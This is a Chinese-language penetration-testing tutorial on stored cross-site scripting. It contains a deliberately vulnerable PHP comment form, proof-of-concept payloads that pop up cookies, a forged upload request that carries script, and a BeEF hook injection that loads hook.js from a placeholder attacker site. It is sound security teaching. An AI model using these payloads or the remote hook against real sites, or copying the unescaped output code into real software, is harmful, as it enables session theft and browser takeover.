## 存储型 XSS

存储型 XSS，也称为持久性 XSS，当应用程序将用户提供的输入存储在 Web 服务器、数据库中，随后不经适当过滤或净化就显示给其他用户，导致脚本在 Web 应用程序的权限下在其机器上执行。

反射型和存储型 XSS 的主要区别在于，反射型 XSS 中输入立即回显给用户，而在存储型 XSS 中，输入在后续阶段反射。这种特殊变体尤其危险，因为在许多情况下，它不需要用户交互，并且有可能广泛传播，影响多个用户。

在支持用户交互的应用程序中，或管理员访问同一个应用程序中的用户 log 和数据的应用程序中，保存型XSS漏洞很常见。所涉及的数据可能通过 HTTP 请求提交给应用程序，例如博客文章上的评论、聊天室中的用户昵称、其他用户的搜索记录或客户订单上的联系方式。在其他情况下，数据可能来自其他不可信源，例如显示通过 SMTP 接收消息的 Web 邮件应用程序、显示社交媒体帖子的营销应用程序，或显示网络流量数据包数据的网络监控应用程序。

此漏洞可用于实施多种基于浏览器的攻击，包括：

- 劫持其他用户的浏览器
- 捕获应用程序用户查看的敏感信息
- 应用程序的伪篡改
- 内部主机的端口扫描（相对于 Web 应用程序用户的“内部”）
- 定向投递基于浏览器的漏洞利用
- 其他恶意活动

存储型 XSS 不需要恶意链接即可被利用。当用户访问包含存储型 XSS 的页面时，即成功利用。典型的存储型 XSS 攻击场景包括以下阶段：

- 攻击者将恶意代码存储到存在漏洞的页面中
- 用户在应用程序中进行认证
- 用户访问存在漏洞的页面
- 恶意代码由用户的浏览器执行

此类攻击还可以利用诸如 [BeEF](https://beefproject.com) 和 [XSS Proxy](https://xss-proxy.sourceforge.net/) 等浏览器利用框架进行利用。这些框架允许进行复杂的 JavaScript 漏洞利用开发。

存储型 XSS 在高权限用户可访问的应用程序区域中尤其危险。当管理员访问存在漏洞的页面时，攻击会自动由其浏览器执行。这可能暴露敏感信息，例如会话授权令牌。

### 易受攻击的代码示例

**易受攻击的代码**
```php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $message = $conn->real_escape_string($_POST['message']);
    $user_id = $_SESSION['user_id'];
    $sql = "INSERT INTO messages (user_id, message) VALUES ('$user_id', '$message')";
    if ($conn->query($sql) === TRUE) {
        echo "Comment posted successfully";
    } else {
        echo "Error: ". $sql. "<br>". $conn->error;
    }
}
if ($result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        echo "<p>". $row["message"]. "</p>";
    }
} else {
    echo "No Comments";
}
```

该代码来自一个包含用户评论表单的应用程序。代码获取用户输入并将其存储到数据库中。输入通过 `real_escape_string` 函数传递，该函数用于防止 SQL 注入。然而，没有检查来防止 HTML/JavaScript 代码的注入，因此当评论表单不进行任何处理显示时，会导致 XSS。

**有效载荷：**
```html
<img src=x onerror=alert(document.domain)>
```

由于有效载荷存储在数据库中，并将提供给每个查看评论的用户，JavaScript 将在每个用户的浏览器上下文中执行，其后果可能广泛传播。

### XSS 示例

#### 分析 HTML 代码

应用程序存储的输入通常在 HTML 标签中使用，但也可能作为 JavaScript 内容的一部分出现。在此阶段，了解输入是否被存储以及它在页面上下文中的位置至关重要。与反射型 XSS 不同，渗透测试人员还应调查应用程序接收和存储用户输入的任何带外通道。

**注意**：应测试管理员可访问的所有应用程序区域，以识别是否存在任何用户提交的数据。

**示例**：`index2.php` 中存储的电子邮件值所在的 HTML 代码：

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />
```

在这种情况下，测试人员需要找到一种方法在 `<input>` 标签外部注入代码，如下所示：

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> MALICIOUS CODE <!-- />
```
#### 测试存储型 XSS

这涉及测试应用程序的输入验证和过滤控制。此情况下的基本注入示例：

- `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
- `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`

确保输入通过应用程序提交。如果实施了客户端安全控制，这通常涉及禁用 JavaScript，或使用 Web 代理修改 HTTP 请求。同时使用 HTTP GET 和 POST 请求测试相同的注入也很重要。上述注入会导致包含 cookie 值的弹出窗口。

注入后的 HTML 代码：

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
```

输入被存储，并且重新加载页面时浏览器会执行 XSS 载荷。如果应用程序对输入进行了转义，测试人员应测试应用程序的 XSS 过滤器。例如，如果字符串“SCRIPT”被替换为空格或 NULL 字符，则这可能表明存在 XSS 过滤。存在多种技术可以规避输入过滤器（参见[反射型 XSS 小节]。参考 [owasp XSS 过滤规避文档](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) ，其中提供了广泛的 XSS 攻击和过滤绕过列表。

#### 使用 BeEF 利用存储型 XSS

存储型 XSS 可以通过诸如 [BeEF](https://www.beefproject.com) 和 [XSS Proxy](https://xss-proxy.sourceforge.net/) 等高级 JavaScript 利用框架进行利用。

典型的 BeEF 利用场景包括：

- 注入一个与攻击者的浏览器利用框架（BeEF）通信的 JavaScript Hook
- 等待应用程序用户查看显示存储输入的漏洞页面
- 通过 BeEF 控制台控制应用程序用户的浏览器

**示例**：`index2.php` 中的 BeEF 注入：

```html
aaa@aa.com"><script src=https://attackersite/hook.js></script>
```

当用户加载页面 `index2.php` 时，浏览器会执行脚本 `hook.js`。然后可以访问 cookie、用户截图、用户剪贴板，并启动复杂的 XSS 攻击。

此攻击在有许多不同权限用户查看的漏洞页面上特别有效。

### 文件上传

如果 Web 应用程序允许文件上传，检查是否可能上传 HTML 内容非常重要。例如，如果允许 HTML 或 TXT 文件，则可以在上传的文件中注入 XSS 载荷。渗透测试人员还应验证文件上传是否允许设置任意的 MIME 类型。

考虑以下文件上传的 HTTP POST 请求：

```http
POST /fileupload.aspx HTTP/1.1
[…]
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
Content-Type: text/plain

test
```

此设计缺陷可以在浏览器 MIME 处理不当攻击中被利用。例如，像 JPG 和 GIF 这样看似无害的文件可能包含 XSS 载荷，当浏览器加载它们时会执行。当图像的 MIME 类型（如 `image/gif`）可以改为 `text/html` 时，就可能发生这种情况。在这种情况下，客户端浏览器会将文件视为 HTML。

伪造的 HTTP POST 请求：

```html
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>
```

### 盲跨站脚本

盲跨站脚本是存储型 XSS 的一种形式。它通常发生在攻击者的载荷被保存在服务器/基础设施上，然后从后端应用程序反射回受害者时。例如，在反馈表单中，攻击者可以使用表单提交恶意载荷，当后端用户/管理员通过后端应用程序查看攻击者的提交时，攻击者的载荷将被执行。


### 灰盒测试

灰盒测试类似于黑盒测试。在灰盒测试中，渗透测试人员对应用程序有部分了解。在这种情况下，渗透测试人员可能了解有关用户输入、输入验证控制和数据存储的信息。

根据可用信息，通常建议测试人员检查用户输入如何被应用程序处理，然后存储到后端系统中。建议执行以下步骤：

- 使用前端应用程序并输入特殊/无效字符
- 分析应用程序响应
- 识别输入验证控制的存在
- 访问后端系统并检查输入是否被存储以及如何存储
- 分析源代码并了解存储的输入如何由应用程序呈现

如果源代码可用（如白盒测试），则应分析输入表单中使用的所有变量。特别是，PHP、ASP 和 JSP 等编程语言使用预定义的变量/函数来存储来自 HTTP GET 和 POST 请求的输入。

下表总结了分析源代码时应查找的一些特殊变量和函数：

| **PHP**        | **ASP**           |  **JSP**         |
|----------------|-------------------|------------------|
| `$_GET` - HTTP GET 变量  | `Request.QueryString` - HTTP GET | `doGet`、`doPost` servlet - HTTP GET 和 POST |
| `$_POST` - HTTP POST 变量| `Request.Form` - HTTP POST | `request.getParameter` - HTTP GET/POST 变量 |
| `$_REQUEST` – HTTP POST、GET 和 COOKIE 变量 | `Server.CreateObject` - 用于上传文件 | |
| `$_FILES` - HTTP 文件上传变量 | | |

**注意**：上表仅是最重要参数的摘要，但所有用户输入参数都应进行调查。


## 存储型 XSS 攻击的影响

如果攻击者可以控制在受害者浏览器中执行的脚本，那么他们通常可以完全控制该用户。攻击者可以执行与[反射型 XSS 漏洞](/web-security/cross-site-scripting/reflected)影响相同的任何操作。

在可利用性方面，反射型 XSS 与存储型 XSS 的关键区别在于，存储型 XSS 漏洞使得攻击可以在应用程序自身内部独立完成。攻击者无需寻找外部方式来诱导其他用户发出包含其漏洞利用的特定请求。相反，攻击者将其漏洞利用放入应用程序本身，然后等待用户遇到它。

存储型跨站脚本的自包含特性在 XSS 漏洞仅影响当前已登录应用程序用户的情况下尤为相关。如果 XSS 是反射型，则攻击必须时机恰当：如果用户在未登录时被诱导发出攻击者的请求，则不会被入侵。相反，如果 XSS 是存储型，则用户在遇到漏洞利用时保证已登录。

## 不同上下文中的存储型 XSS

存储型跨站脚本有许多不同类型。存储数据在应用程序响应中的位置决定了需要哪种类型的载荷来利用它，并且还可能影响漏洞的影响。

此外，如果应用程序在存储数据之前或在将存储数据合并到响应时执行了任何验证或其他处理，这通常会影响所需的 XSS 载荷类型。

## 如何发现和测试存储型 XSS 漏洞

手动测试存储型 XSS 漏洞需要测试所有相关的“入口点”（攻击者可控数据可通过这些点进入应用程序的处理流程），以及所有“出口点”（数据可能在这些点出现在应用程序的响应中）。

应用程序处理的入口点包括：

- URL 查询字符串和消息正文中的参数或其他数据。
- URL 文件路径。
- HTTP 请求标头（这些在反射型 XSS 中可能无法利用）。
- 任何带外路径，攻击者可通过这些路径将数据传送到应用程序中。存在的路径完全取决于应用程序实现的功能：Web 邮件应用程序将处理电子邮件中接收的数据；显示 Twitter 动态的应用程序可能处理第三方推文中包含的数据；新闻聚合器将包含源自其他网站的数据。

存储型 XSS 的出口点是所有可能在任何情况下返回给任何类型应用程序用户的 HTTP 响应。

测试存储型 XSS 漏洞的第一步是定位入口点和出口点之间的链接，即提交到入口点的数据从出口点发出。这可能具有挑战性的原因在于：

- 提交到任何入口点的数据原则上可能从任何出口点发出。例如，用户提供的显示名称可能出现在一个只有部分应用程序用户可见的隐蔽审计日志中。
- 应用程序当前存储的数据可能因应用程序内执行的其他操作而被覆盖。例如，搜索功能可能显示最近的搜索列表，这些列表会随着用户执行其他搜索而迅速被替换。

为了全面识别入口点和出口点之间的链接，需要分别测试每个排列，将特定值提交到入口点，直接导航到出口点，并确定该值是否出现在那里。然而，对于超过几个页面的应用程序，这种方法不切实际。

相反，更实际的方法是系统地遍历数据入口点，向每个入口点提交一个特定值，并监控应用程序的响应以检测提交值出现的情况。可以特别关注相关的应用程序功能，例如博客文章的评论。当在响应中观察到提交的值时，您需要确定数据是否确实跨不同请求存储，而不是仅在即时响应中被反射。

> 如果在每个页面的每一个参数提交相同的测试字符串，那么你可能会发现，这个字符串在应用程序的许多位置重复出现，因而无法准确确定每个出现的字符串由哪个参数负责。为避免出现这个问题，在探查保存型XSS时，可以为每个参数提交一个不同的测试字符串，例如，把测试字符串与它提交到其中的字段名称连接起来。

当您识别出应用程序处理中入口点和出口点之间的链接后，需要专门测试每个链接以检测是否存在存储型 XSS 漏洞。这包括确定响应中存储数据出现的上下文，并测试适用于该上下文的合适候选 XSS 载荷。此时，测试方法与发现[反射型 XSS 漏洞](/web-security/cross-site-scripting/reflected)的方法大致相同。

在某个位置（例如，个人信息页面的姓名字段）输入用户控制的数据，这个数据可能会在应用程序的许多不同位置显示（例如，用户主页上、注册用户列表中、任务等工作流程项目中、其他用户的联系列表中、用户提交的消息或问题中、应用程序日志中等）。应用程序可能对每个出现的字符串实施了不同的保护性过滤，因此需要对它们进行单独分析。

### 在Web邮件应用程序中测试XSS

由于Web邮件应用程序将直接从第三方收到的内容包含在向用户显示的应用程序页面中，因此，这种程序本身就存在着保存型XSS攻击风险。要测试这种功能，应该在该应用程序上创建自己的电子邮件账户，并通过电子邮件向自己实施大量XSS攻击，然后在该应用程序中查看每封邮件，确定是否有任何攻击取得成功。

为彻底完成这一任务，你需要通过电子邮件发送各种反常的HTML内容。如果仅限于使用标准电子邮件客户端，你可能会发现，无法完全控制原始的邮件内容，或者邮件客户端可能会净化或“清除”你有意设计的畸形语法。

在这种情况下，最好是采用其他方法来生成电子邮件，以便于直接控制邮件的内容。一种方法是使用UNIX `sendmail`命令。

在消息主体中测试各种XSS有效载荷和避开过滤的机制时，也可以尝试指定不同的Content-Type和charset

### 在上传文件中测试XSS

如果应用程序允许用户上传可被其他用户下载并查看的文件，就会出现保存型XSS漏洞；然而，这种漏洞常常被人们忽略。如今的应用程序通常都提供文件上传功能，除传统的用于文件共享的工作流功能外，文件还可以通过电子邮件附件的形式传送给Web邮件用户。图像文件则可以附加到博客文章中，并且可以用作定制的头像或通过相册共享。

应用程序是否易于受到上传文件的攻击，取决于许多影响因素：

- 在文件上传过程中，应用程序可能会限制可以上传的文件的扩展名。

- 在文件上传过程中，应用程序可能会检查文件内容，以确认其是否为所需的格式，如JPEG。

- 在文件下载过程中，应用程序可能会返回Content-Type消息头，以指定文件所包含的内容的类型，如image/jpeg。

- 在文件下载过程中，应用程序可能会返回Content-Disposition消息头，以指定浏览器应将文件保存到磁盘上。否则，对于相关的内容类型，应用程序会处理并在用户的浏览器中显示文件。

在测试文件上传功能时，首先你应该尝试上传一个包含概念验证脚本的简单HTML文件。如果该文件被接受，则尝试以正常方式下载该文件。如果应用程序按原样返回最初的文件，并且你的脚本得以执行，则应用程序肯定易于受到攻击。

如果应用程序阻止上传的文件，则尝试使用各种文件扩展名，包括.txt和.jpg。

即使应用程序返回Content-Type消息头，指定下载文件应为图像，但是，如果文件实际包含的是HTML内容，一些浏览器仍然会将该文件作为HTML处理。

#### 混合文件攻击

通常，为防范上述攻击，应用程序会对上传文件的内容执行某种确认，以确保其确实包含所需格式的数据，如图像。但是，使用“混合文件”（在一个文件中组合两种不同的格式）仍然可以对这些应用程序实施攻击。

### Ajax 显示图片中嵌入的 HTML 内容

一些应用程序使用Ajax来检索和呈现在片段标识符之后指定的URL。例如，应用程序的页面中可能包含以下链接：

`http://wahh-app.com/#profile`

当用户单击此链接时，客户端脚本将处理单击事件，使用Ajax来检索在片段标识符之后显示的文件，并在现有页面中的`<div>`元素的innerHtml中设置响应。这样可提供无缝的用户体验，因为单击用户界面中的选项卡将更新所显示的内容，而无须重新加载整个页面。

在这种情况下，如果应用程序还包含其他允许上传和下载图像文件（如用户头像）的功能，你就可以上传一个包含嵌入式HTML标记的有效图像文件，并构建以下URL，使客户端代码提取该图像并将其作为HTML显示`http://wahh-app.com/#profiles/images/15234917624.jpg`

HTML可以嵌入到有效图像文件的各种位置，包括图像的注释部分。一些浏览器，包括Firefox和Safari，乐于将图像文件以HTML格式显示。图像的二进制部分将显示为乱码，而任何嵌入的HTML将正常显示（执行）。

假设潜在的受害者使用的是兼容HTML5的浏览器，如果所请求的域许可，该浏览器可用于跨域传送Ajax请示。在这种情况下，另一种可能的攻击方法，是在片段标识符后面放置一个绝对URL，指定一个位于可与目标域进行Ajax交互的服务器上的、完全由攻击者控制的外部HTML文件。如果客户端脚本不确认所请示的URL是否在同一个域上，客户端远程文件包含攻击将取得成功。

## 工具

- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) 帮助您将任意文本编码到 65 种字符集之间，您可以在自定义载荷中使用这些字符集。
- [Hackvertor](https://hackvertor.co.uk/public) 是一个在线工具，允许对 JavaScript（或任何字符串输入）进行多种类型的编码和混淆。
- [BeEF](https://www.beefproject.com) 是浏览器利用框架。用于演示浏览器漏洞实时影响的专业工具。
- [XSS-Proxy](https://xss-proxy.sourceforge.net/) 是一个高级跨站脚本（XSS）攻击工具。
- [Burp Proxy](https://portswigger.net/burp/) 是一个用于攻击和测试 Web 应用程序的交互式 HTTP/S 代理服务器。
- [XSS Assistant](https://www.greasespot.net/) Greasemonkey 脚本，允许用户轻松测试任何 Web 应用程序的跨站脚本缺陷。
- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) 是一个带有内置扫描器的交互式 HTTP/S 代理服务器，用于攻击和测试 Web 应用程序。
- [XSS Hunter Portable](https://github.com/mandatoryprogrammer/xsshunter) XSS Hunter 可发现各种类型的跨站脚本漏洞，包括经常被忽略的盲 XSS。

## 参考资料

### OWASP 资源

- [XSS 过滤规避速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### 书籍

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", 第二版, McGraw-Hill, 2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3

### 白皮书

- [CERT: “CERT Advisory CA-2000-02 嵌入在客户端 Web 请求中的恶意 HTML 标签”](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Amit Klein: “跨站脚本详解”](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)
- [CGISecurity.com: “跨站脚本常见问题”](https://www.cgisecurity.com/xss-faq.html)
